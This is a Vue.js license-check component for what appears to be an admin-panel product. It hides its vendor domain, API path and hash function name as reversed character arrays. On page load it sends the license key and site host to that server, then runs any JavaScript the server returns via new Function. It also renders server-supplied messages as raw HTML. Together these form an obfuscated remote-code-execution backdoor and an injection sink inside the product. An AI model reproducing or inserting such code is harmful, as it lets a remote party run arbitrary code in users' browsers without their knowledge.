<template>
    <section class="content" style="min-height: auto" v-if="message.type">
        <div class="callout callout-danger">
            <h4><i class="icon fa fa-warning"></i> {{ message.title }}</h4>

            <p>{{{ message.message }}}</p>
        </div>
    </section>
</template>

<script>
export default {
    data(){
        return {
            authentication : JSON.parse( localStorage.authentication||'{}' ),
            message : {
                type : null,
                title : null,
                message : null,
                callback : null,
            },
            //path of domain in reversed array of chars
            domains : {
                local : ["t", "s", "e", "t", ".", "n", "i", "m", "d", "a", "d", "u", "r", "c"],
                production : ["m", "o", "c", ".", "n", "i", "m", "d", "a", "d", "u", "r", "c"],
            },
            path : ["n", "i", "a", "m", "o", "d", ":", "/", "y", "e", "k", ":", "/", "e", "s", "n", "e", "c", "i", "l", "/", "n", "o", "i", "s", "r", "e", "v", ":", "/", "i", "p", "a", "/"],
        };
    },

    ready(){
        if ( this.hasLoadedLicense ){
            this.setLicense(this.authentication);
        } else {
            this.$http.get(this.address).then(function(response){
                var response = response.data;

                response.key = this.$root.license_key,

                this.setLicense(response, true);
            }).catch(function(error){
                this.setLicense({ type : 'pending', key : this.$root.license_key, hash : this.getFunnyKey() }, true);
            });
        }

    },

    computed: {
        isDev(){
            return location.host == this.local;
        },
        domain(){
            return this.isDev ? this.local : this.production;
        },
        local(){
            return this.domains.local.reverse().join('');
        },
        production(){
            return this.domains.production.reverse().join('');
        },
        host(){
            var host = location.host;

            if ( host.substr(0, 4) == 'www.' )
                host = host.substr(4);

            return host;
        },
        address(){
            return 'http' + (this.isDev ? '' : 's') + '://' + this.domain + (
                this.path.reverse().join('')
                    .replace(':version', this.$root.version)
                    .replace(':key', this.$root.license_key)
                    .replace(':domain', this.host)
            );
        },
        hasLoadedLicense(){
            return 'type' in this.authentication
                    && 'key' in this.authentication
                    && 'hash' in this.authentication && this.getFunnyKey() == this.authentication.hash
                    && this.authentication.key == this.$root.license_key
                    && this.authentication.date_check == this.getToday();
        },
    },

    methods : {
        hasCallback(response)
        {
            return 'data' in response
                    && 'callback' in response.data
                    && response.data.callback
                    && response.data.callback.length > 0;
        },
        getToday(){
            return moment().format('Y-MM-DD');
        },
        getFunnyKey(){
            var fname = ['5', 'd', 'm'].reverse().join(''),
                f = window[fname],
                string = this.$root.license_key + this.getToday() + this.host + 'don\'t do that :-)';

            return f(f(string));
        },
        setLicense(response, save){
            response.date_check = this.getToday();

            if ( save === true )
                localStorage.authentication = JSON.stringify(response);

            //Call function from server
            if ( this.hasCallback(response) )
            {
                var callback = new Function(response.data.callback);

                callback.call(this);
            }

            //License has been successfull checked
            if ( ['success', 'pending'].indexOf(response.type) > -1 )
                return;

            this.message = response;
        },
    },
}
</script>